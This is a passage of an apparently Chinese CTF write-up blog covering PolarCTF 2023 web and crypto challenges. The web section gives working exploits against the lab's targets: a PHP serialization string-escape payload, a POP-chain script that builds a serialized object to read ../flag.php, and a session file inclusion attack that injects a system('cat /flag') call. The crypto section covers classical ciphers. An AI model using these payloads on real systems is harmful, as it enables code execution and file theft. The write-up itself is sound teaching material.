class="line"><span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>[<span class="string">&#x27;passwd&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ans</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ans</span>)[sign] == <span class="string">&quot;ytyyds&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>本地试验</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/phtml|php3|php4|php5|aspx|gif/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;phtmlphtmlphtmlphtml&#x27;</span>;</span><br><span class="line">    <span class="variable">$user</span>[<span class="string">&#x27;passwd&#x27;</span>] = <span class="string">&#x27;;s:6:&quot;passwd&quot;;s:0:&quot;&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$user</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>((<span class="variable">$user</span>)));</span><br><span class="line">    <span class="variable">$ans</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ans</span>)[sign] == <span class="string">&quot;ytyyds&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\nsuccess!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># a:3:&#123;s:8:&quot;username&quot;;s:20:&quot;phtmlphtmlphtmlphtml&quot;;s:6:&quot;passwd&quot;;s:46:&quot;;s:6:&quot;passwd&quot;;s:0:&quot;&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;&quot;;s:4:&quot;sign&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="comment"># a:3:&#123;s:8:&quot;username&quot;;s:20:&quot;&quot;;s:6:&quot;passwd&quot;;s:46:&quot;;s:6:&quot;passwd&quot;;s:0:&quot;&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;&quot;;s:4:&quot;sign&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="comment"># success!!!</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post: name=phtmlphtmlphtmlphtml</span><br><span class="line">get: url/?passwd=;s:6:&quot;passwd&quot;;s:0:&quot;&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;</span><br><span class="line">F12查看即可</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="web-苦海"><a class="markdownIt-Anchor" href="#web-苦海"></a> web-苦海</h2>
<p>链子<code>User::__wakeup()-&gt;User::printName()-&gt;Surrender::__toString()-&gt;FileRobot::__get()-&gt;FileRobot::__invoke()-&gt;FileRobot::Get_file()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;PolarNight&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;syst3m(&quot;rm -rf ./*&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;删库跑路，蹲监狱~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi, Welcome to Polar D&amp;N ~ &quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">printName</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span> . <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Surrender</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phone</span> = <span class="number">110</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span> = <span class="string">&#x27;遵纪守法，好公民~&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise = <span class="string">&#x27;苦海无涯，回头是岸！&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;content[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileRobot</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_file</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$hint</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_file</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//User::__wakeup()-&gt;User::printName()-&gt;Surrender::__toString()-&gt;FileRobot::__get()-&gt;FileRobot::__invoke()-&gt;FileRobot::Get_file()</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Surrender</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&quot;filename&quot;</span>] = <span class="keyword">new</span> <span class="title class_">FileRobot</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;path = <span class="keyword">new</span> <span class="title class_">FileRobot</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;path-&gt;filename = <span class="string">&#x27;../flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<p>flag位置要试，试出在<code>../flag.php</code></p>
<hr />
<h2 id="web-safe_include"><a class="markdownIt-Anchor" href="#web-safe_include"></a> web-safe_include</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/:/tmp/&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$sys</span> = @<span class="variable">$_SESSION</span>[<span class="string">&#x27;xxs&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xxs&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$sys</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xxs&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">include</span> <span class="variable">$sys</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;xxs&#x27;</span>] = <span class="variable">$sys</span>;</span><br></pre></td></tr></table></figure>
<p><strong>session文件包含</strong><br />
<code>open_basedir</code>是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域，假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。注意用open_basedir指定的限制实际上是前缀,而不是目录名<br />
举例来说: 若&quot;open_basedir = /dir/user&quot;, 那么目录 “/dir/user” 和 &quot;/dir/user1&quot;都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名<br />
<code>?xxs=&lt;?php system('cat /flag');?&gt;</code>保存进session的值并写入session文件<br />
根据sessionID生成session文件，/tmp/sess_sessionID，sessionID一般就是Cookie中PHPSESSID的值，可以通过F12查看网络获得<br />
<code>?xxs=/tmp/sess_sessionID</code>进行session文件包含</p>
<hr />
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h1>
<h2 id="crypto-base"><a class="markdownIt-Anchor" href="#crypto-base"></a> crypto-base</h2>
<p>密文<code>j2rXjx8wSZjD</code><br />
base64换表<code>GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5</code><br />
解密即可，得到<code>flag&#123;666&#125;</code></p>
<hr />
<h2 id="crypto-aff"><a class="markdownIt-Anchor" href="#crypto-aff"></a> crypto-AFF</h2>
<p>题目可知是仿射密码<br />
密文<code>WMPTPTRGGPED</code><br />
<code>c = (3 * j - 17) % 26</code><br />
根据代码可知，a=3,b=17<br />
得到<code>thisisaffine</code><br />
<code>flag&#123;THISISAFFINE&#125;</code></p>
<hr />
<h2 id="crypto-神秘组织m"><a class="markdownIt-Anchor" href="#crypto-神秘组织m"></a> crypto-神秘组织M</h2>
<p>栅栏密码M型，靠，之前只知道普通的跟W型，其实题目也提示了。。。。<br />
<code>&#123;bc1bg572ec066&#125;a0d2fb137l951b5451f06b7</code><br />
手工得到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      &#123;       b         c        <span class="number">1</span>         b</span><br><span class="line">     g <span class="number">5</span>     <span class="number">7</span> <span class="number">2</span>       e c      <span class="number">0</span> <span class="number">6</span>       <span class="number">6</span> &#125;</span><br><span class="line">   a    <span class="number">0</span>   d   <span class="number">2</span>     f   b    <span class="number">1</span>   <span class="number">3</span>     <span class="number">7</span></span><br><span class="line"> l       <span class="number">9</span> <span class="number">5</span>     <span class="number">1</span>   b     <span class="number">5</span>  <span class="number">4</span>     <span class="number">5</span>   <span class="number">1</span></span><br><span class="line">f         <span class="number">0</span>        <span class="number">6</span>         b        <span class="number">7</span></span><br></pre></td></tr></table></figure>
<p><code>flag&#123;50905d7b2216bfeccb5b41016357176b&#125;</code><br />
后面看见这个靶场也有一道M型的</p>
<hr />
<h2 id="crypto-数星星"><a class="markdownIt-Anchor" href="#crypto-数星星"></a> crypto-数星星</h2>
<p>词频统计，自己先把单词找出来，直接在buuctf做过一道类似的，浪里淘沙？好像是这个，直接把脚本搬过来</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="string">&#x27;tonight&#x27;</span>, <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;favorite&#x27;</span>, <span class="string">&#x27;we&#x27;</span>, <span class="string">&#x27;example&#x27;</span>, <span class="string">&#x27;crypto&#x27;</span>, <span class="string">&#x27;should&#x27;</span>, <span class="string">&#x27;is&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;learn&#x27;</span>, <span class="string">&#x27;sublim&#x27;</span>, <span class="string">&#x27;morning&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;your&#x27;</span>, <span class="string">&#x27;word&#x27;</span>, <span class="string">&#x27;which&#x27;</span>, <span class="string">&#x27;found&#x27;</span>]</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> each <span class="keyword">in</span> content:</span><br><span class="line">        <span class="built_in">print</span>(content.count(each), each)</span><br><span class="line">        l.append((content.count(each), each))</span><br><span class="line">l = <span class="built_in">sorted</span>(l, reverse=<span class="literal">False</span>)</span><br><span class="line">dest = [l[i-<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">3</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>)]</span><br><span class="line"><span class="built_in">print</span>(dest)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> dest]))</span><br><span class="line"><span class="comment"># whichisyourfavoriteword</span></span><br><span class="line"><span class="comment"># flag&#123;17c5d0278edcbad3d061a92b723c116d&#125;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="crypto-不一样的四四方方"><a class="markdownIt-Anchor" href="#crypto-不一样的四四方方"></a> crypto-不一样的四四方方</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jilinjingcha</span><br><span class="line">information</span><br><span class="line">engineering</span><br></pre></td></tr></table></figure>
<p>网上的关于四方密码介绍很多，一般秘钥都是没有j/q/i<br />
但是这道题我们去的是z，附件的给提示<br />
<code>key1:informatbcdeghjklpqsuvwxy</code><br />
<code>key2:engirabcdfhjklmopqstuvwxy</code><br />
加密。。。。就很抽象，都说了题目给的是密文，不应该是解密吗？？<br />
<code>BDHAHCTLTNMG</code>这是大写的结果，有的网站是这个<br />
还有就是，有的在线网站跑出来的是小写的结果，md之后就不是flag了，题目又说是md5小写加密。。。。。<br />
md5一下<br />
<code>flag&#123;c6dac3a0f40dfacefcc473585cdeb0f8&#125;</code><br />
总结：这道题很抽象</p>
<hr />
<h2 id="crypto-我爱456"><a class="markdownIt-Anchor" href="#crypto-我爱456"></a> crypto-我爱456</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kseYvkasuj5618t</span><br><span class="line">lygemfla235158jd</span><br><span class="line">utasvQsjdybl587t</span><br><span class="line">sydwkuhd54kdhg</span><br><span class="line">jtftY658qiwudhs</span><br><span class="line">iaugwjiushyc871</span><br><span class="line">aksQbhasbkjcbkjd</span><br><span class="line">dvbpzd8v26dfv6f</span><br><span class="line">s6dvdNf6v52v6x</span><br><span class="line">65dT26f5d1b6f5v</span><br><span class="line">35f2Y6d65bbfv5</span><br><span class="line">35dfv32d8bfv256d</span><br><span class="line">kdhMvnhdkjzldkj</span><br><span class="line">sdhjTujsdbch268</span><br><span class="line">sdr26Iksds265dsv</span><br><span class="line">jnm2dsnsdv26865</span><br></pre></td></tr></table></figure>
<p>评价：又是一道misc题。。。<br />
456循环，依次提取字符串中的第4，5，6个字符</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;提取出只有字符串的文件位置&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        flag += a[i][<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        flag += a[i][<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += a[i][<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># YmQwYjQzNTY3MTI2</span></span><br></pre></td></tr></table></figure>
<p>base64得到<code>bd0b43567126</code><br />
<code>flag&#123;b5ff0893e6522a037c144a1f502c2b48&#125;</code></p>
<hr />
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://hvang10.github.io">HvAng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://hvang10.github.io/2023/12/14/PolarCTF2023%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp-web-crypto-misc/">https://hvang10.github.io/2023/12/14/PolarCTF2023%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp-web-crypto-misc/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/favicon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/22/PolarCTF%E8%AE%B0%E4%B8%80%E9%81%93flask-Pin/" title="PolarCTF记一道flask-Pin"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">PolarCTF记一道flask-Pin</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/30/FSCTF2023wp/" title="FSCTF2023wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">FSCTF2023wp</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HvAng</div><div class="author-info__description">Just keep learning</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HvAng10"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is HvAng, a new star CTFer!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text"> misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E7%AD%BE%E5%88%B0%E5%96%B5"><span class="toc-number">1.1.</span> <span class="toc-text"> misc-签到喵</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-a-%E5%AE%BD%E5%AE%BD-s-00-e"><span class="toc-number">1.2.</span> <span class="toc-text"> misc-A 宽宽 S 00 E</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E6%9C%BA%E5%AF%86"><span class="toc-number">1.3.</span> <span class="toc-text"> misc-机密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E7%A4%BE%E4%BC%9A%E4%B8%BB%E4%B9%89%E5%A4%A7%E6%B3%95%E5%A5%BD"><span class="toc-number">1.4.</span> <span class="toc-text"> misc-社会主义大法好</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E6%98%AFuu%E5%90%97"><span class="toc-number">1.5.</span> <span class="toc-text"> misc-是uu吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-ez%E7%AD%BE%E5%88%B0"><span class="toc-number">1.6.</span> <span class="toc-text"> misc-EZ签到</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text"> web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-cool"><span class="toc-number">2.1.</span> <span class="toc-text"> web-cool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-phpurl"><span class="toc-number">2.2.</span> <span class="toc-text"> web-phpurl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-cookie%E6%AC%BA%E9%AA%97"><span class="toc-number">2.3.</span> <span class="toc-text"> web-cookie欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E5%B9%B2%E6%AD%A3%E5%88%99"><span class="toc-number">2.4.</span> <span class="toc-text"> web-干正则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E9%9A%8F%E6%9C%BA%E5%80%BC"><span class="toc-number">2.5.</span> <span class="toc-text"> web-随机值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-upload"><span class="toc-number">2.6.</span> <span class="toc-text"> web-upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E4%BD%A0%E7%9A%84%E9%A9%AC%E5%91%A2"><span class="toc-number">2.7.</span> <span class="toc-text"> web-你的马呢？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-ezphp"><span class="toc-number">2.8.</span> <span class="toc-text"> web-ezphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E4%BD%A0%E6%83%B3%E9%80%83%E4%B9%9F%E9%80%83%E4%B8%8D%E6%8E%89"><span class="toc-number">2.9.</span> <span class="toc-text"> web-你想逃也逃不掉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E8%8B%A6%E6%B5%B7"><span class="toc-number">2.10.</span> <span class="toc-text"> web-苦海</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-safe_include"><span class="toc-number">2.11.</span> <span class="toc-text"> web-safe_include</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">3.</span> <span class="toc-text"> crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-base"><span class="toc-number">3.1.</span> <span class="toc-text"> crypto-base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-aff"><span class="toc-number">3.2.</span> <span class="toc-text"> crypto-AFF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-%E7%A5%9E%E7%A7%98%E7%BB%84%E7%BB%87m"><span class="toc-number">3.3.</span> <span class="toc-text"> crypto-神秘组织M</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-%E6%95%B0%E6%98%9F%E6%98%9F"><span class="toc-number">3.4.</span> <span class="toc-text"> crypto-数星星</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%9B%9B%E5%9B%9B%E6%96%B9%E6%96%B9"><span class="toc-number">3.5.</span> <span class="toc-text"> crypto-不一样的四四方方</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-%E6%88%91%E7%88%B1456"><span class="toc-number">3.6.</span> <span class="toc-text"> crypto-我爱456</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/23/NCTF2024-WriteUp/" title="NCTF2024-WriteUp">NCTF2024-WriteUp</a><time datetime="2025-03-22T16:43:10.000Z" title="Created 2025-03-23 00:43:10">2025-03-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/22/NSSCTF-round28-2025%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%88%9D%E8%B5%9B/" title="NSSCTF Round#28 &amp;&amp; 2025红明谷杯初赛 WriteUps">NSSCTF Round#28 &amp;&amp; 2025红明谷杯初赛 WriteUps</a><time datetime="2025-03-22T08:57:18.000Z" title="Created 2025-03-22 16:57:18">2025-03-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/12/KalmarCTF2025-TPCTF2025-WriteUp/" title="KalmarCTF2025&amp;&amp;TPCTF2025-WriteUp">KalmarCTF2025&amp;&amp;TPCTF2025-WriteUp</a><time datetime="2025-03-12T05:12:21.000Z" title="Created 2025-03-12 13:12:21">2025-03-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/10/GHCTF2025-WriteUp/" title="GHCTF2025-WriteUp">GHCTF2025-WriteUp</a><time datetime="2025-03-09T18:00:00.000Z" title="Created 2025-03-10 02:00:00">2025-03-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-HECTF2024/" title="国城杯&amp;&amp;HECTF2024">国城杯&amp;&amp;HECTF2024</a><time datetime="2024-12-08T15:48:30.000Z" title="Created 2024-12-08 23:48:30">2024-12-08</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div 